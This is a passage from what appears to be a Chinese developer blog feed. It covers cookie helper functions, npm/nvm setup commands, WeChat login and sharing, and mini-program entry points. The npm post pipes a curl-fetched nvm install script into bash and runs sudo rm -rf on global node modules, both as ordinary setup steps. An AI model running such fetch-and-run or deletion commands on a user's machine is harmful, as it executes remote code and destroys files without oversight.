class="keyword">let</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</span><br><span class="line">    <span class="keyword">if</span> (cookieEnd === <span class="number">-1</span>) &#123;</span><br><span class="line">      cookieEnd = <span class="built_in">document</span>.cookie.length;</span><br><span class="line">    &#125;</span><br><span class="line">    cookieValue = <span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd);</span><br><span class="line">    cookieValue = <span class="built_in">decodeURIComponent</span>(cookieValue);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cookieValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cookieText = <span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(name)&#125;</span>=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(value)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">if</span> (expires) &#123;</span><br><span class="line">    cookieText += <span class="string">`;expires=<span class="subst">$&#123;expires.toUTCString()&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (path) &#123;</span><br><span class="line">    cookieText += <span class="string">`;path=<span class="subst">$&#123;path&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (domain) &#123;</span><br><span class="line">    cookieText += <span class="string">`;domain=<span class="subst">$&#123;domain&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">    cookieText += <span class="string">';secure'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.cookie = cookieText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delCookie</span>(<span class="params">name, path, domain, secure</span>) </span>&#123;</span><br><span class="line">  setCookie(name, <span class="string">''</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>), path, domain, secure);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从setCookie来看，每个参数都暗藏玄机。</p><ul><li>name和value</li></ul><p>name和value自不必多说，cookie是存储的一个个键值对，name和value都需要encode之后存储，如果没有encode会怎么样呢？</p><p>在chrome中试验<code>document.cookie=&#39;%ddd=2=%#&amp;试试中文&#39;</code>依然可以设置cookie成功，读取时也可以读取到，但是为了规范存取，还是需要encode之后再读写。</p><ul><li>expires</li></ul><p>如果不设置expires，会得到<strong>session级别的cookie</strong>。一定要注意，session的定义是把<strong>整个浏览器关闭</strong>之后，这些cookie才会消失，而不是仅仅关闭所在的tab页。</p><ul><li>path</li></ul><p>如果不设置path的话，得到的cookie的path会是当前页面的path哦。比如在<code>eva.com/blog/page/1.html</code>中设置cookie，不设置path，得到的cookie的path会是<code>/blog/page/</code></p><ul><li>domain</li></ul><p>仔细观察可以发现，cookie中的domain有的是带点的比如<code>.eva.com</code>，有的是不带点的<code>eva.com</code>。它们的区别是什么？又是怎么设置成功的呢？</p><p><code>eva.com</code>和<code>.eva.com</code>的区别</p><p>cookie也符合<strong>同源策略</strong>，带点的表示子域如<code>account.eva.com</code>也可以访问，而不带点的要求严格，只能在本域名中访问。</p><p>如果不设置domain的话，就默认是当前不带点的域名。如果设置域名的话，会下发在带点的域名下，子域也可以共享cookie。</p><p>比如在<code>eva.com/blog/page/1.html</code>中设置cookie，不设置domain，得到的cookie的path会是eva.com，<code>setCookie(&#39;key&#39;,&#39;value&#39;,new Date(),&#39;/&#39;,&#39;eva.com&#39;)</code>设置了domain的话，会自动加上.变成<code>.eva.com</code>。</p><p>后端下发的cookie也同理，看是否设置域名。</p><p>带不带点需要视情况而定，看是否允许子域获取到cookie。</p><h4 id="cookie的使用场景"><a href="#cookie的使用场景" class="headerlink" title="cookie的使用场景"></a>cookie的使用场景</h4><p>1.登录态的记录</p><p>sso登录中需要用cookie来记录用户的登录态</p><p>2.已阅读标识</p><p>对于只出现一次的用户协议，我们需要一个已阅读的标识，这个时候其实可以不需要后端，前端设置一个cookie来作为已经出现过的标识。</p><p>其他待补充</p><h4 id="遇到的那些问题"><a href="#遇到的那些问题" class="headerlink" title="遇到的那些问题"></a>遇到的那些问题</h4><p>1.cookie大小的问题</p><p>有的时候后端为了全面追溯用户的状态下，发的cookie非常大，注意一般浏览器的cookie大小限制是4kb左右，保险起见最好不要超过4kb。过大的cookie会下发不成功，遇到问题不好定位。</p><p>有时候运维也会在ngnix对cookie设置大小限制，一般比4kb还小，这个时候问题就更难定位了，可以作为一个排查点。</p><p>另外过大的cookie还会造成严重的性能问题。一般没有特别做性能优化的网站js/css/img等静态资源都和接口共用一个域名，域名下如果有很多的cookie的话，每次获取静态资源时这些cookie也会带在了请求中，虽然有4kb的限制，但是还是会造成不必要的网络开销，如果条件允许，建议启动<strong>和主站不同的域名来放置静态资源</strong>。虽然采用不同的域名导致多次建立网络连接，会多耗费时间，可以权衡一下采用哪种方案。</p><p>和server端强调下最好不要下发没必要的cookie，注意cookie的大小。</p><p>2.cookie标志用户，用户切换时要注意避免cookie污染。</p><p>使用cookie进行交互时一定要注意各个用户切换时造成的问题。一定能覆盖成功才可以</p><p>3.熟练使用抓包工具避免推诿</p><p>chrome中network的追溯</p><p>一旦涉及到cookie的问题，特别是webview中的cookie，需要iOS，andriod，FE，server端一起来定位问题，这个时候非常需要一个工具来确定到底谁是罪魁祸首。熟练使用抓包工具会避免推诿，省心不少。</p><p>一定要看清楚到底是response cookie和request cookie，明确cookie是在哪个请求中下发的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HTTP是无状态的协议，cookie可以用来存储用户的信息方便追踪。&lt;br&gt;
    
    </summary>
    
    
      <category term="HTTP" scheme="https://evacoder.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>npm常用命令一网打尽</title>
    <link href="https://evacoder.com/2018/11/30/npm/"/>
    <id>https://evacoder.com/2018/11/30/npm/</id>
    <published>2018-11-30T10:02:09.000Z</published>
    <updated>2019-03-29T03:29:27.495Z</updated>
    
    <content type="html"><![CDATA[<p>npm笔记，纯粹记录下，哪天电脑坏了快速重装一遍不走弯路。<br><a id="more"></a></p><h4 id="nvm-管理-node-版本"><a href="#nvm-管理-node-版本" class="headerlink" title="nvm 管理 node 版本"></a>nvm 管理 node 版本</h4><p>首先先把全局安装的 packages 记录下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有全局安装 package</span></span><br><span class="line">npm ls -g --depth=0</span><br></pre></td></tr></table></figure><p>/Users/eva/.nvm/versions/node/v10.15.3/lib<br>├── @<a href="mailto:vue/cli@3.5.2" target="_blank" rel="noopener">vue/cli@3.5.2</a><br>├── <a href="mailto:eslint@5.15.3" target="_blank" rel="noopener">eslint@5.15.3</a><br>├── <a href="mailto:express@4.16.4" target="_blank" rel="noopener">express@4.16.4</a><br>├── <a href="mailto:gulp-cli@2.1.0" target="_blank" rel="noopener">gulp-cli@2.1.0</a><br>├── <a href="mailto:hexo-cli@1.1.0" target="_blank" rel="noopener">hexo-cli@1.1.0</a><br>├── <a href="mailto:npm@6.9.0" target="_blank" rel="noopener">npm@6.9.0</a><br>├── <a href="mailto:nrm@1.1.0" target="_blank" rel="noopener">nrm@1.1.0</a><br>├── <a href="mailto:webpack@4.29.6" target="_blank" rel="noopener">webpack@4.29.6</a><br>├── <a href="mailto:webpack-cli@3.3.0" target="_blank" rel="noopener">webpack-cli@3.3.0</a><br>└── <a href="mailto:yo@2.0.5" target="_blank" rel="noopener">yo@2.0.5</a></p><p>然后把原来全局安装的 node 删掉，反正以后也不用了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除全局安装的 package</span></span><br><span class="line">sudo rm -rf /usr/<span class="built_in">local</span>/lib/node_modules</span><br><span class="line"><span class="comment"># 删除 node</span></span><br><span class="line">sudo rm /usr/<span class="built_in">local</span>/bin/node</span><br><span class="line"><span class="comment"># 删除全局 node 模块注册的软链</span></span><br><span class="line"><span class="built_in">cd</span>  /usr/<span class="built_in">local</span>/bin &amp;&amp; ls -l | grep <span class="string">"../lib/node_modules/"</span> | awk <span class="string">'&#123;print $9&#125;'</span>| xargs rm</span><br></pre></td></tr></table></figure><p>安装 nvm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh | bash</span><br></pre></td></tr></table></figure><p>修改环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">"<span class="variable">$HOME</span>/.nvm"</span></span><br><span class="line">[ -s <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> ] &amp;&amp; . <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span></span><br></pre></td></tr></table></figure><p>查看手册</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有命令</span></span><br><span class="line">nvm -h</span><br><span class="line"><span class="comment"># 安装最新Long-term-support版</span></span><br><span class="line">nvm install --lts</span><br><span class="line"><span class="comment"># 比如10.5.3</span></span><br><span class="line">nvm use 10.5.3</span><br></pre></td></tr></table></figure><p>LTS是基础库的开发者对库的使用者的一个承诺，保证某个版本的库发布之后的很长一段事件之内都得到支持。如果此版本发现一些紧急问题需要修复，那么就会在这个版本上进行更新。通常这些问题的修复都不会导致 API 变化（API 保证长期兼容），所以版本号的前两位是不变的，通常只变化第三位。</p><h4 id="安装全局-package"><a href="#安装全局-package" class="headerlink" title="安装全局 package"></a>安装全局 package</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i -g @vue/cli eslint express nrm webpack webpack-cli gulp</span><br><span class="line"><span class="comment"># 自己安装自己来更新 npm</span></span><br><span class="line">npm i -g npm</span><br></pre></td></tr></table></figure><p>一般不要随便切换 node 版本，如果要切换，记得把全局安装的 packge 重新安装在那个 node 版本下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install v12.0.0 --reinstall-packages-from=8.0.0</span><br></pre></td></tr></table></figure><h4 id="nrm-管理-npm-源"><a href="#nrm-管理-npm-源" class="headerlink" title="nrm 管理 npm 源"></a>nrm 管理 npm 源</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nrm ls</span><br><span class="line">nrm use cnpm</span><br></pre></td></tr></table></figure><p>  npm —- <a href="https://registry.npmjs.org/" target="_blank" rel="noopener">https://registry.npmjs.org/</a></p><p>* cnpm — <a href="http://r.cnpmjs.org/" target="_blank" rel="noopener">http://r.cnpmjs.org/</a><br>taobao - <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org/</a><br>nj —– <a href="https://registry.nodejitsu.com/" target="_blank" rel="noopener">https://registry.nodejitsu.com/</a><br>npmMirror  <a href="https://skimdb.npmjs.com/registry/" target="_blank" rel="noopener">https://skimdb.npmjs.com/registry/</a><br>edunpm - <a href="http://registry.enpmjs.org/" target="_blank" rel="noopener">http://registry.enpmjs.org/</a></p><p>这样就可以方便的管理 npm 的源。</p><h4 id="npm私服"><a href="#npm私服" class="headerlink" title="npm私服"></a>npm私服</h4><p>如果公司内部搭建了私有的 npm，也使用 nrm 也可以更好切换和管理。</p><p>比如我有个 npm 私服</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nrm add eva http://registry.npm.evacoder.com/ </span><br><span class="line">npm use eva</span><br></pre></td></tr></table></figure><p>指定好源之后，还是用 npm 命令，而不用使用 cnpm 等命令。</p><p>私服不会全量同步 npm 包，有时候找不到时需要手动同步下 package。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://npm.evacoder.com/sync/[package] </span><br><span class="line"># 或者浏览器访问 http://npm.evacoder.com/sync/[package]</span><br></pre></td></tr></table></figure><h4 id="发布自己的-npm-package"><a href="#发布自己的-npm-package" class="headerlink" title="发布自己的 npm package"></a>发布自己的 npm package</h4><p>其实 npm package 就是一个自己写的 js export 出来而已。发布一个 package 只需要</p><p>1.写代码，2.注册 npm 帐号(私服就addUser)，3.发布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册登录</span></span><br><span class="line">npm login</span><br><span class="line"><span class="comment"># 填写 username，password，email</span></span><br><span class="line"><span class="comment"># 新建项目</span></span><br><span class="line">npm init --yes</span><br></pre></td></tr></table></figure><p>package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"@eva/hello-world"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">  <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="string">'hello Eva'</span>;</span><br></pre></td></tr></table></figure><p>发布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发布</span></span><br><span class="line">npm publish</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"><span class="comment"># -S是保存到 package.json中</span></span><br><span class="line"><span class="comment"># -D 是指是 devDependency，只是工具，不会打包到代码中去的</span></span><br><span class="line">npm i -S -D @eva/hello-world</span><br><span class="line">node -e <span class="string">'console.log(require("@eva/hello-world"))'</span></span><br></pre></td></tr></table></figure><p>具体的 编写高质量npm package 的详细内容将在 sdk 编写心得中展开来说</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;npm笔记，纯粹记录下，哪天电脑坏了快速重装一遍不走弯路。&lt;br&gt;
    
    </summary>
    
    
      <category term="tool" scheme="https://evacoder.com/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>「 产品 」极简小程序产品设计笔记</title>
    <link href="https://evacoder.com/2018/10/12/minimalism_product_design/"/>
    <id>https://evacoder.com/2018/10/12/minimalism_product_design/</id>
    <published>2018-10-12T10:26:01.000Z</published>
    <updated>2019-02-14T09:04:45.209Z</updated>
    
    <content type="html"><![CDATA[<p>最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的<a href="https://www.youzan.com" target="_blank" rel="noopener">有赞</a>的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。<br>这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了<strong>提高审美，学习成为一个设计师的基本技能</strong>，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。</p><a id="more"></a><h4 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h4><p>从六年前开始接触极简主义生活方式，如果你要让我说极简主义的好，我可以说三天三夜，哈哈，这里就不赘述，留到产品中去体现。<br>因为最近经济形势不好，消费降级突然变得流行起来，现在我的豆瓣timeline中有无数的人开始安利极简生活。</p><p>如果你要问我极简是什么？我会说极简是寻找生活的最优解，入了极简主义可以大概率保证你的人生一直走上坡路，我相信极简一定会贯穿我整个生命。<br>一直想自己做个什么项目，想着热爱整理的我，每天整理一百遍，把自己所有的物品都进行统计盘点，希望有个方便的进行物品盘点的小程序。</p><p>产品方面，18年学习了<a href="https://book.douban.com/subject/25915629/" target="_blank" rel="noopener">破茧成蝶：用户体验设计师的成长之路</a>，妥协的完美主义，绝密原型档案，<a href="https://book.douban.com/subject/4723970/" target="_blank" rel="noopener">人人都是产品经理</a>，得到上的梁宁产品30讲，希望可以全面实践下。</p><h4 id="项目总览"><a href="#项目总览" class="headerlink" title="项目总览"></a>项目总览</h4><p>在平常的工作中项目大概也会分为这三个部分。<br>1.管理后台<br>CRUD，主要是增删改查数据，权限控制等。<br>技术栈：<br>vue的element-ui，有现成的管理后端的模版 <a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">vue-element-admin</a><br>node express+mongoose<br>2.小程序<br><a href="https://github.com/Meituan-Dianping/mpvue" target="_blank" rel="noopener">mpvue</a> 和 <a href="https://github.com/Tencent/wepy" target="_blank" rel="noopener">wepy</a> 各有优劣，wepy因为是官方支持，用的会比较多一点。<br><a href="https://github.com/aben1188/awesome-wepy" target="_blank" rel="noopener">awesome-wepy</a> 有很多小程序源码可以学习。<br><a href="https://github.com/dyq086/wepy-mall" target="_blank" rel="noopener">一个电商小程序的全功能源码</a><br>3.web页<br>暂定只是一个介绍页，以后可以加入其他的信息。<br>前后端分离响应式。</p><p>本文会持续更新产品进度。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的&lt;a href=&quot;https://www.youzan.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;有赞&lt;/a&gt;的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。&lt;br&gt;这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了&lt;strong&gt;提高审美，学习成为一个设计师的基本技能&lt;/strong&gt;，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。&lt;/p&gt;
    
    </summary>
    
    
      <category term="产品" scheme="https://evacoder.com/tags/%E4%BA%A7%E5%93%81/"/>
    
  </entry>
  
  <entry>
    <title>「 微信开发 」手机浏览器唤起微信app登录的可行性</title>
    <link href="https://evacoder.com/2018/10/12/wechat_dev_app_login/"/>
    <id>https://evacoder.com/2018/10/12/wechat_dev_app_login/</id>
    <published>2018-10-12T10:26:01.000Z</published>
    <updated>2019-03-13T11:58:52.345Z</updated>
    
    <content type="html"><![CDATA[<p>微信的地位越来越高，隔不了多久就有大佬问，为什么你们的手机端H5没有微信登录的入口，压力很大呀。</p><p>可能是安全问题或者其他考虑，微信在网页端只提供了扫码登录的入口，即使在手机端集成了微信登录，用户点开也会很奇怪，这个码只有PC端的样式，看起来很奇怪，而且怎么用我的手机微信来扫这个手机浏览器这个码呢？而且即使可以扫码成功也无法登录成功，所以看了大部分的公司都选择在手机浏览器隐藏了微信登录的入口。</p><a id="more"></a><h4 id="jd唤起微信app登录"><a href="#jd唤起微信app登录" class="headerlink" title="jd唤起微信app登录"></a>jd唤起微信app登录</h4><p>但是细心的PM发现，京东居然有微信登录的入口，但是一般也只是在QQ浏览器或者系统浏览器中支持，可以直接打开手机上的微信app，但是在无痕模式或者其他的浏览器也无法成功。</p><p>前端无隐私，让我们来F12来看看他们是怎么做到的。</p><p><img src="/images/wap_wxlogin.png" alt=""></p><p>可以发现，京东的微信登录并没有什么特别的，也是各种302跳转最后到了 <a href="https://open.weixin.qq.com/sns/explorer_broker?appid=wx2f5d8f9715c59d10&amp;redirect_uri=https%3A%2F%2Fplogin.m.jd.com%2Fcgi-bin%2Fml%2Fwxcallback%3Flsid%3Dq9ibchzrnbivxypneji7r4sxusp24wrv&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=smr1qm3p&amp;connect_redirect=1的" target="_blank" rel="noopener">https://open.weixin.qq.com/sns/explorer_broker?appid=wx2f5d8f9715c59d10&amp;redirect_uri=https%3A%2F%2Fplogin.m.jd.com%2Fcgi-bin%2Fml%2Fwxcallback%3Flsid%3Dq9ibchzrnbivxypneji7r4sxusp24wrv&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=smr1qm3p&amp;connect_redirect=1 </a>这个页面。最重要的是这个是微信的域名，所以我们可以知道，这个跳转是微信主动触发的。</p><p>怪不得说京东是微信亲儿子嘛。让我们看看这个页面做了什么事。</p><p><img src="/images/wap_wxlogin2.png" alt="">前面都是一些环境的判断，而且这些都是微信方帮忙实现的。最重要的是<code>location.href = &#39;weixin://dl/business/?ticket=tb15388ef1a6e07db69a0d57a87345f93&#39;</code></p><p>前端是可以实现打开微信app的，但是如何打开微信中某个特定的页面就需要微信app来支持了，而微信为京东做了特殊的处理，可以做到直接打开微信的app中京东的微信授权页面。</p><p>所以如果我们的业务也需要实现这个功能，就需要向微信申请了。</p><p>后来沟通发现微信是有开放的H5唤起微信app登录功能的。</p><p>PC端需要使用web app的appid来进行扫码登录</p><p>H5端（手机浏览器，微信的webview）需要申请一个公众号来完成这个功能，只支持safari，QQ浏览器和UC浏览器。</p><p>另外一个更激进的就是QQ了，公告说是为了一些不安全因素，在18年年初完全下掉了wap端网页登录的方式，现在wap端的QQ登录都采用直接打开QQ app的方式来授权登录。在某些非系统浏览器中因为无法打开app就悲剧了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;微信的地位越来越高，隔不了多久就有大佬问，为什么你们的手机端H5没有微信登录的入口，压力很大呀。&lt;/p&gt;
&lt;p&gt;可能是安全问题或者其他考虑，微信在网页端只提供了扫码登录的入口，即使在手机端集成了微信登录，用户点开也会很奇怪，这个码只有PC端的样式，看起来很奇怪，而且怎么用我的手机微信来扫这个手机浏览器这个码呢？而且即使可以扫码成功也无法登录成功，所以看了大部分的公司都选择在手机浏览器隐藏了微信登录的入口。&lt;/p&gt;
    
    </summary>
    
    
      <category term="微信开发" scheme="https://evacoder.com/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>「 微信开发 」微信分享功能</title>
    <link href="https://evacoder.com/2018/09/28/wechat_dev_share/"/>
    <id>https://evacoder.com/2018/09/28/wechat_dev_share/</id>
    <published>2018-09-28T10:27:12.000Z</published>
    <updated>2019-01-09T02:03:16.301Z</updated>
    
    <content type="html"><![CDATA[<p>实践微信的分享功能<br><a id="more"></a><br>接入js-sdk的分享功能，分享出去的地址会变成</p><p><a href="https://i.mi.com/static2?filename=MicloudWebBill/event/recruit/index.html&amp;from=singlemessage&amp;isappinstalled=0" target="_blank" rel="noopener">https://i.mi.com/static2?filename=MicloudWebBill/event/recruit/index.html&amp;from=singlemessage&amp;isappinstalled=0</a></p><p>后台签名如果是写死url的话，第二次分享就会有签名错误的问题，导致分享出去用户看到的description和头图都没有了，变成了默认的url地址。</p><p>所以后端需要实时获取url地址来加密签名，以免导致二次分享出错的问题</p><p>一般给后端传入当前<code>location.href</code></p><p>建议查看<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421141115</a>中的<strong>附录5-常见错误及解决方法</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实践微信的分享功能&lt;br&gt;
    
    </summary>
    
    
      <category term="微信开发" scheme="https://evacoder.com/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>「 微信开发 」小程序的入口</title>
    <link href="https://evacoder.com/2018/09/22/wechat_dev_miniprogram_entrance/"/>
    <id>https://evacoder.com/2018/09/22/wechat_dev_miniprogram_entrance/</id>
    <published>2018-09-22T12:02:14.000Z</published>
    <updated>2019-03-13T12:00:06.489Z</updated>
    
    <content type="html"><![CDATA[<p>用户在使用微信时，打开小程序的体验要比打开H5页面的体验要好得多，老板希望在H5页面可以直接打开小程序。</p><p>查阅资料发现，至目前为止，现在H5和小程序互相跳转的唯二方式如下：<br><a id="more"></a></p><p>1.可以在H5的页面中放一个小程序的二维码，用户<strong>长按识别</strong>小程序二维码就可以跳转到小程序中</p><p>2.或者把H5页面嵌入到小程序的web-view中，在H5页面中通过调用JS-SDK的<code>wx.navigateToMiniProgram</code>跳转到小程序的native页面中。注意此时行为都发生在小程序中，H5的域名需要在小程序的域名校验名单中。</p><p>除了以上入口，还有：</p><p>1.用户在小程序中点分享给朋友，还可以把小程序发在消息中。</p><p>2.在公众号文章中可以直接打开小程序。</p><p>但是非小程序内嵌的H5是不能直接打开小程序的。</p><p>参考文档：</p><p><a href="https://developers.weixin.qq.com/miniprogram/dev/component/web-view.html" target="_blank" rel="noopener">微信的web-view API</a></p><p><a href="https://www.jianshu.com/p/50657f9af5b4" target="_blank" rel="noopener">小程序内嵌网页的方法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用户在使用微信时，打开小程序的体验要比打开H5页面的体验要好得多，老板希望在H5页面可以直接打开小程序。&lt;/p&gt;
&lt;p&gt;查阅资料发现，至目前为止，现在H5和小程序互相跳转的唯二方式如下：&lt;br&gt;
    
    </summary>
    
    
      <category term="微信开发" scheme="https://evacoder.com/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>「 微信开发 」前言</title>
    <link href="https://evacoder.com/2018/09/18/wechat_dev_intro/"/>
    <id>https://evacoder.com/2018/09/18/wechat_dev_intro/</id>
    <published>2018-09-18T10:23:29.000Z</published>
    <updated>2019-03-13T12:01:33.355Z</updated>
    
    <content type="html"><![CDATA[<p>现在经济不景气，小公司拿不到投资，连iOS开发和andriod开发都招不起，而微信凭借着众多的用户，成为了开发的热土，一个创业公司可以没有App，但一定会需要先在微信里试水，是公司获客的最佳渠道。</p><p>这个系列记录了微信开发遇到的问题，和产品狗相爱相杀的往事。</p><a id="more"></a><p>目录（也是产品狗的那些呐喊）：</p><p>0.开发前的了解</p><p>1.我想要在微信的H5页面里直接打开小程序</p><p>2.我想要做活动页分享给好友</p><p>3.我想小程序和webview的登录态互相传递</p><p>…</p><h4 id="关于H5的那些争执"><a href="#关于H5的那些争执" class="headerlink" title="关于H5的那些争执"></a>关于H5的那些争执</h4><p>H5，在我们大前端眼中实际是HTML5的缩写，其实HTML已经是缩写了，缩完再缩，就变成了他们口中的H5，实际上只有中国人才会这么称呼，要是跟老外说H5，H five，他们就懵逼了。</p><p>比如App，并不是任何词组的缩写，而是Application的简读，只有中国人才会读APP。还有那个UGG的鞋子，实际上应该念‘阿哥’，但是呢，你开心就好。嗯，啥时候出一个程序员英语装逼指南应该会更受欢迎吧。</p><p>说回H5，对于FE来说，HTML5只不过是一种语言而已。</p><p>对于PM还有其他非前端的开发人员来说，H5指的是手机端上的网页。</p><p>对于运营妹子来说，嗯，H5呀，我也会做哦。实际上他们说的是，可以拖拖拽拽，像做PPT一样生成的页面，便于在微信里快速传播。</p><p>虽然他们说的都不对，但他们开心就好，能听懂就好。</p><h4 id="关于微信公众平台和开放平台"><a href="#关于微信公众平台和开放平台" class="headerlink" title="关于微信公众平台和开放平台"></a>关于微信公众平台和开放平台</h4><p>公众平台：<a href="https://mp.weixin.qq.com/" target="_blank" rel="noopener">https://mp.weixin.qq.com/</a> 主要用在公众号，运营妹子登的多，我们需要开发微信公众号的一些活动页面时也需要在里面配置一些东西</p><p>开放平台：<a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">https://open.weixin.qq.com/</a> 主要用在各种开发上，app，小程序，公众号都包括</p><h4 id="开发公众号页面的配置"><a href="#开发公众号页面的配置" class="headerlink" title="开发公众号页面的配置"></a>开发公众号页面的配置</h4><p>有的公号后台都是运营或PM来管，都不让我们FE来登录。下面是我们开发必要的一些信息。</p><p><img src="/images/微信公众平台-基本配置.png" alt=""></p><h5 id="首页-gt-开发-gt-基本配置"><a href="#首页-gt-开发-gt-基本配置" class="headerlink" 